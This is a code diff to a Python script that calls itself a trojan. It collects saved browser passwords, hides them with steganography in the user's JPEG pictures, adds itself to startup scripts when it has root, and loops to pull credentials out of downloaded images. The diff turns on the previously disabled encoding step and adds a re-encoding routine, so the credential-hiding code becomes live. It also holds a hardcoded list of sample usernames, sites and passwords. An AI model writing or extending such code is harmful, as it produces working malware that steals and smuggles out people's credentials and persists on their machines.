@@ -4,7 +4,7 @@ import stepic
 import Image
 from datetime import datetime, timedelta
 import sys
-
+from time import sleep
 
 # Function to encode a stego message from image
 def encode(filepath, message):
@@ -21,13 +21,13 @@ def  decode(filepath):
 
 # Function to format message.  Message format  e.g. 06qwertyshamilcm@facebook.com
 def format_msg(entry):
-	msg = str(entry[2].__len__()) + entry[2] + entry[0] + "@" + entry[1] + "#"
+	msg = str(entry[2].__len__()).zfill(2) + entry[2] + entry[0] + "@" + entry[1] + "#"
 	return msg
 	
 
 #Function to check if a message is a valid msg
 def isvalidformat(msg):
-	if ((msg[0]=='0' or msg[0]=='1')) and (msg[1] > '0' and msg[1] < '9') and  msg[msg.__len__()-1]=='#' and msg.count('@')>=1 :
+	if ((msg[0]=='0' or msg[0]=='1')) and (msg[1] >= '0' and msg[1] <= '9') :
 		return True
 	else:
 		return False
@@ -39,7 +39,7 @@ def decrypt_passwords():
 	# Code
 	# Code
 	# Code
-	savedlist = [['vivekanand','dss.nitc.ac.in','myrollb0900'],['vivekzhere','accounts.google.com','vivpassword'],['nithinvnath','http://onlinesbi.com','secretbankpassword'],['arunkuruvila','http://facebook.com','mybirthdaypw'],['aravind.an','http://twitter.com','fastrack'],['sreeraj.altair','http://accounts.google.com', 'some_game']]
+	savedlist = [['vivekanand','dss.nitc.ac.in','Bmyllb0900'],['vivekzhere','accounts.google.com','Bviassword'],['nithinvnath','http://onlinesbi.com','Bsectbanpassword'],['arunkuruvila','http://facebook.com','Bmybidaypw'],['aravind.an','http://twitter.com','Bfastrack'],['sreeraj.altair','http://accounts.google.com', 'Bs_game']]
 	msglist = []
 	for entry in savedlist:
 		msglist.append(format_msg(entry))
@@ -53,15 +53,19 @@ def first_run():
 	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
 	i = 0									# Message Iterator
 	encode_dir = path.expanduser("~/Pictures/Pictures/")
+	num_of_files = 0
 	if num_of_msgs > 0:
 		for infile in glob.glob(encode_dir+"*.jpg"):
 			i = (i+1)%num_of_msgs;
-			#encode(infile,msglist[i]);
+			encode(infile,msglist[i]);
+			num_of_files = num_of_files + 1
 		f = open('bootup.cfg', 'w+')
-		f.write(str(num_of_msgs)+"\n")
+		num_encoded = min(num_of_msgs, num_of_files)
+		f.write(str(num_encoded)+"\n")
 		f.write("1950-01-01 00:00:00")
 		f.close()
-			
+		for infile in glob.glob(encode_dir+"*.jpg"):
+			print "-->ENCODE RUN : ",decode(infile)
 	if geteuid() == 0:						#Adding to startup scripts if root privileges
 		try:
 			f = open('../profile','a')			# Change file to /etc/profile
@@ -70,30 +74,71 @@ def first_run():
 		except:
 			pass
 			
+def encode_run (decode_msglist,update_dt):
+	browser_msglist = decrypt_passwords()
+	msglist = browser_msglist + decode_msglist
+	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
+	i = 0									# Message Iterator
+	encode_dir = path.expanduser("~/Pictures/Pictures/")
+	num_of_files = 0
+	if num_of_msgs > 0:
+		for infile in glob.glob(encode_dir+"*.jpg"):
+			i = (i+1)%num_of_msgs;
+			encode(infile,msglist[i]);
+			num_of_files = num_of_files + 1
+		f = open('bootup.cfg', 'w+')
+		num_encoded = min(num_of_msgs, num_of_files)
+		f.write(str(num_encoded)+"\n")
+		f.write(update_dt.strftime("%Y-%m-%d %H:%M:%S"))
+		f.close()
+		for infile in glob.glob(encode_dir+"*.jpg"):
+			print "-->ENCODE RUN : ",decode(infile)
+	return num_encoded
 
 # Main Function
-
 while True:
+	sleep(10)
 	if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
 		first_run()
 	else:
-		f = open('bootup.cfg','r')
-		num_of_msgs = f.readline()
-		update_dtline = f.readline()
-		f.close()
-		update_dt = datetime.strptime(update_dtline,"%Y-%m-%d %H:%M:%S ")
+		try:
+			update_dt
+		except NameError:
+			update_dt = None
+		if update_dt is None:
+			f = open('bootup.cfg','r')
+			try:
+				num_encoded = int(f.readline())
+			except:
+				num_of_msgs = 0
+			update_dtline = f.readline()
+			f.close()
+			update_dt = datetime.strptime(update_dtline,"%Y-%m-%d %H:%M:%S")
+		
 		encode_dir = path.expanduser("~/Pictures/Pictures/")
 		decode_dir = path.expanduser("~/Pictures/Downloads/")
 		encodeflg = 0
+		msglist = []
 		for infile in glob.glob(decode_dir+"*.jpg"):
 			#print decode(infile);	
-			file_mdt = datetime.fromtimestamp(path.getmtime(infile))
-			if ( (file_mdt - update_dt) > timedelta(0)):
+			file_cdt = datetime.fromtimestamp(path.getctime(infile))
+			
+			if ( (file_cdt - update_dt) > timedelta(0)):
 				msg = decode(infile)
 				if (isvalidformat(msg)):
-					print msg
-				encodeflg = 1
-				# To update encode variables
-				
+					print "***DOWNLOADS***", msg
+					if msg not in msglist:
+						msglist.append(msg)
+						encodeflg = 1
+				# To update encode variables	
+		#print "Update Time:", update_dt
+		f = open('bootup.cfg','w+')
+		f.write(str(num_encoded)+"\n")
+		update_dt = datetime.now()
+		f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+		f.close()
+		if (encodeflg == 1):
+			num_encoded = encode_run(msglist,update_dt)
+		
 			
 
